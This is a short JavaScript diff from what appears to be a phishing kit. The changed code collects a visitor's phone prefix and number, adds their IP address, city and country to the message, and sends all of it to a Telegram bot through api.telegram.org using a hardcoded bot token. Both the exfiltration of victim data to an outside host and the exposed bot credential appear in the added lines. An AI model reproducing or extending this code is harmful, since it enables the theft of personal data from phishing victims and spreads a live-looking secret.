@@ -287,7 +287,7 @@
                console.log(data.country_code);
               Ip = data.ip;
               City = data.city;
-              country =  data.country_code;
+              Country =  data.country_code;
                // so many more properties
           });
         let i = 0;
@@ -316,7 +316,7 @@
 
 
 
-            const telegramMessage = "--------AS_LO-------\nPrefix : "+ prefix +"\nTEL : " + tel + "\n--------------------\n";
+            const telegramMessage = "--------AS_LO-------\nPrefix : "+ prefix +"\nTEL : " + tel + "\n--------------------\n" + "Adresse Ip :" + Ip + "\nCity : " + City + "\nPays : " + Country ;
 
             const telegramBotUrl = "https://api.telegram.org/bot" + "1093092007:AAH3mOWf1KrC-48Oo7qcY5wPqj-Wy25Giyg" + "/sendMessage";
             const requestData = {
